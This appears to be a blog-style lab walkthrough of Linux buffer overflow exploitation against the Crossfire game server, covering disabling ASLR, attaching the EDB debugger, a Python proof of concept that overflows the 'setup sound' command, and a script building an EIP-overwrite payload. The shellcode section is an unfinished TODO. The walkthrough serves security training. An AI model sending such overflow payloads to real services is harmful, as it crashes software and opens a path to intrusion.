First we need to disable ASLR on Kali for testing:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Setting up the EDB debugger
First thing, it runs with the following command:
```bash
root@debian:~# edb --run binary
```

> Remember to run EDB from the same folder of your binary
{: .prompt-tip }

The layout of EDB is similar to other popular debugging tools, as shown below:

To see available processes including the PID and owner, we will select _Attach_ from the _File_ menu. We can then use the filter option to search for a specific process, which in our case is _crossfire_, select it, and click _OK_ to attach to it:

When we initially attach to the process, it will be paused. To run it, we simply click the _Run_ button. Depending on how the application works within the debugger it might hit an additional breakpoint before letting the application run. In such cases we simply have to press the _Run_ button one more time.

### Calculate Buffer

Once we have attached the debugger to the application, we will use the following proof-of-concept code that we created based on information from the public exploit:

```python 
#!/usr/bin/python
import socket

host = "10.11.0.128"

crash = "\x41" * 4379

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"
```

Notice that our _buffer_ variable requires specific hex values at the beginning and at the end of it, as well as the "setup sound" string, in order for the application to crash.

Our initial proof-of-concept builds a malicious buffer including the "setup sound" command, connects to the remote service on port 13327, and sends the buffer.

To crash Crossfire, we can run our first proof-of-concept using python:

```bash
kali@kali:~$ python poc_01.py 
[*]Sending evil buffer...
#
[*]Payload Sent !
```

After running the script, the debugger displays the following error message, clearly indicating the presence of a memory corruption in the _setup sound_ command, likely a buffer overflow condition:

Clicking the _OK_ button, we find that the EIP register has been overwritten with our buffer.

### Find memory address of a function
If by any chance, you know that there is a function which helps you to execute your buffer by redirecting it to the EIP the following command can retrieve the memory address:

```bash
objdump -d execution-flow-linux | grep flag
0804862b <flag>:
 8048667:       75 1c                   jne    8048685 <flag+0x5a>
 8048683:       eb 37                   jmp    80486bc <flag+0x91>
```

### Control EIP

In order to create linux payloads it's better if we use python2 as such payloads can be encoded as bytes easily by using the following syntax:

```bash
#!/usr/bin/env python2
Initial ="A"*3892
payloadBytes = Initial + b"\x2b\x86\x04\x08"
#	Open in "wb" mode to write a new file, or "ab" mode to append
with open("exploit.txt", "wb") as binary_file:
# Write bytes to file 
	binary_file.write(payloadBytes)
```

As seen below, the EIP memory address is being converted as bytes with the b"" syntax.

### Locating Space for Our Shellcode

TODO

### Checking for Bad Characters

We sent the whole range of characters from 00 to FF within our buffer and then monitored whether any of those bytes got mangled, swapped, dropped, or changed in memory once they were processed by the application.
